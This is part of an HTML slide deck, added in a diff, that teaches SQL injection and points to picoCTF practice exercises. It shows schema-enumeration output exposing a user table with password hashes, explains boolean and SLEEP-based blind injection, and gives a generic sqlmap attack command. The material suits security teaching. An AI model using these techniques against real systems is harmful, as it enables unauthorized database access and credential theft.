+</section>
+<section id="slide-orgde2f064">
+<h4 id="orgde2f064">Example</h4>
+<pre class="example">
+sqlite&gt; SELECT * FROM sqlite_schema;
+table|user|user|2|CREATE TABLE user (
+	id INTEGER NOT NULL,
+	username VARCHAR(80) NOT NULL,
+	password_hash VARCHAR(128) NOT NULL,
+	PRIMARY KEY (id),
+	UNIQUE (username)
+)
+index|sqlite_autoindex_user_1|user|3|
+table|code_snippet|code_snippet|4|CREATE TABLE code_snippet (
+	id INTEGER NOT NULL,
+	user_id INTEGER NOT NULL,
+	code TEXT NOT NULL,
+	PRIMARY KEY (id),
+	FOREIGN KEY(user_id) REFERENCES user (id)
+)
+</pre>
+
+<pre class="example">
+sqlite&gt; SELECT sql FROM sqlite_schema WHERE name = 'user';
+CREATE TABLE user (
+	id INTEGER NOT NULL,
+	username VARCHAR(80) NOT NULL,
+	password_hash VARCHAR(128) NOT NULL,
+	PRIMARY KEY (id),
+	UNIQUE (username)
+)
+</pre>
+</section>
+</section>
+<section>
+<section id="slide-orgdf47c4f">
+<h2 id="orgdf47c4f">Blind injections</h2>
+<p>
+Sometimes, we won&rsquo;t be able to view the result of the query directly.
+</p>
+
+<p>
+In such cases we are injecting <i>blind</i> and must use other mechanism to get the information back.
+</p>
+
+<p>
+If we can get some indicator that a query evaluated to false (returned no
+results), we do a boolean blind injection and extract one bit of information per
+query.
+</p>
+
+<p>
+If no such indicator exists, we may still be able to evaluate something like
+<code>SLEEP(5)</code> conditionally on the query and the query completion time would get us
+one bit of information.
+</p>
+
+</section>
+<section>
+
+<p>
+As these mechanism are query-intensive (many queries are needed to get complete
+information), we use automated tools or scripts that do the injections and data
+collection automatically.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org8e28da8">
+<h3 id="org8e28da8"><code>sqlmap</code></h3>
+<p>
+Automatic SQL injection and database takeover tool
+</p>
+
+<p>
+Very complete and many options, check the <code>--help</code>, <code>tldr</code> and online examples.
+</p>
+
+<p>
+e.g.,
+</p>
+<pre class="example">
+sqlmap -u URL --data=DATA
+</pre>
+
+<p>
+Tries to inject the given <i>URL</i> with POST data <i>DATA</i>.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org6282de8">
+<h2 id="org6282de8">Exercises</h2>
+<ul>
+<li>SQL Direct
+<a href="https://play.picoctf.org/practice/challenge/303">https://play.picoctf.org/practice/challenge/303</a></li>
+<li>Startup Company
+<a href="https://play.picoctf.org/practice/challenge/108">https://play.picoctf.org/practice/challenge/108</a></li>
+<li>PicoCTF 2026</li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org56d2f19">
+<h2 id="org56d2f19">Further learning</h2>
+<ul>
+<li>pwn.college — Learn to Hack!
+<a href="https://pwn.college/">https://pwn.college/</a></li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-orga2500e3">
+<h2 id="orga2500e3">References</h2>
+<ul>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/">https://swisskyrepo.github.io/PayloadsAllTheThings/</a></li>
+<li><a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org459bdb1">
+<h2 id="org459bdb1">Hack time!</h2>
+<ul>
+<li><a href="https://play.picoctf.org/practice">https://play.picoctf.org/practice</a></li>
+<li><a href="https://www.root-me.org/">https://www.root-me.org/</a></li>
+
+</ul>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/markdown.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/search/search.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/plugin/zoom/zoom.js"></script>
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+controls: true,
+progress: true,
+history: false,
+center: true,
+slideNumber: 'c',
+rollingLinks: false,
+keyboard: true,
+mouseWheel: false,
+fragmentInURL: false,
+hashOneBasedIndex: false,
+pdfSeparateFragments: true,
+overview: true,
+
+transition: 'slide',
+transitionSpeed: 'default',
+
+// Plugins with reveal.js 4.x
+plugins: [ RevealMarkdown, RevealNotes, RevealSearch, RevealZoom ],
+
+// Optional libraries used to extend reveal.js
+dependencies: [
+]
+
+});
+</script>
+</body>
+</html>
